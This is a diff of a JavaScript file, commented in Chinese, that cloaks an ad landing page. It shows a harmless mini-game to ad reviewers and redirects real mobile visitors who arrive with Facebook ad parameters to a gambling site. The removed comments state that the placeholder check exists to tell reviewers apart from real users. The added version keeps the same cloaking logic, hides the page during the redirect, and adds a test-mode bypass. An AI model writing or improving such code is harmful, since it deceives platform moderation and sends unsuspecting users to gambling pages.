@@ -1,52 +1,51 @@
 (function() {
-    // 【配置：跳转目标地址】
-    var config_target = "https://www.goldenslot11.com/13/?p0=1uk61sz6".trim(); 
+    // 1. 修复：必须给一个有效的目标地址
+    var config_bproducturl = "https://www.goldenslot11.com/13/?p0=1uk61sz6"; 
 
-    function isRealClick() {
-        var searchRaw = window.location.search.toLowerCase();
-        var ua = navigator.userAgent.toLowerCase();
-        
-        // 1. 占位符拦截：只要链接里还有 {{ 就不跳（这是区分审核与真实用户的关键）
-        if (searchRaw.indexOf('%7b%7b') > -1 || searchRaw.indexOf('{{') > -1) return false;
-
-        // 2. 存在性校验：只要有参数名且内容不全为空格就通过
-        var params = new URLSearchParams(window.location.search);
-        var required = ['fbclid', 'pixel', 'apkch', 'campaign', 'adgroup', 'creative'];
-        
-        for (var i = 0; i < required.length; i++) {
-            var val = params.get(required[i]);
-            // 只要 val 存在，并且 trim 掉空格后不是空字符串，就视为有效
-            if (!val || val.trim() === "") return false;
+    function getQueryStr(str) {
+        if (!str) return {};
+        var obj = {};
+        var search = str.split('?')[1];
+        if(!search) return {};
+        search = search.split('&');
+        for (var i = 0; i < search.length; i++) {
+            var item = search[i].split('=');
+            // 修复：获取值时自动解码并去空格
+            obj[item[0]] = decodeURIComponent(item[1] || "").trim();
         }
-
-        // 3. 硬件环境：必须是手机 (iOS/Android)
-        if (!/iphone|ipad|ipod|android/.test(ua)) return false;
-
-        return true; 
+        return obj;
     }
 
-    // --- 执行逻辑 ---
-    if (isRealClick()) {
-        try {
-            var connector = config_target.indexOf('?') > -1 ? '&' : '?';
-            var finalUrl = config_target + connector + window.location.search.substring(1);
+    var query = getQueryStr(location.search);
+    var ua = navigator.userAgent.toLowerCase();
 
-            // 判定成功：瞬间让 body 透明，防止闪烁
-            document.body.style.opacity = "0";
+    // 核心判定逻辑
+    function shouldJump() {
+        // A. 测试模式优先
+        if (query.funtest === '1') return true;
+        // B. 环境拦截：必须是手机，不能有占位符
+        if (!/android|iphone|ipad|ipod/.test(ua)) return false;
+        if (location.search.indexOf('{{') > -1 || location.search.indexOf('%7b') > -1) return false;
+        // C. 参数拦截：fbclid 和其他参数不能为空或空格
+        if (!query.fbclid || !query.campaign || !query.adgroup) return false;
+        
+        return true;
+    }
 
-            // 执行瞬间重定向
-            window.location.replace(finalUrl);
-
-            // 兜底：如果 4 秒没跳走（可能目标站挂了），恢复显示游戏，不留白屏
-            setTimeout(function() {
-                document.body.style.opacity = "1";
-            }, 4000);
-
-        } catch (e) {
-            document.body.style.opacity = "1";
-        }
+    if (shouldJump()) {
+        // 判定成功：执行零闪烁跳转
+        document.body.style.opacity = "0";
+        var connector = config_bproducturl.indexOf('?') > -1 ? '&' : '?';
+        var finalUrl = config_bproducturl + connector + window.location.search.substring(1);
+        
+        // 尝试跳转
+        window.location.replace(finalUrl);
+        
+        // 超时恢复，防止白屏
+        setTimeout(function() { document.body.style.opacity = "1"; }, 3500);
     } else {
-        // 条件不满足：直接显示小游戏
+        // 判定失败：正常加载游戏逻辑
+        console.log("Safe Mode: Loading game...");
         if (typeof init === 'function') init();
     }
 })();
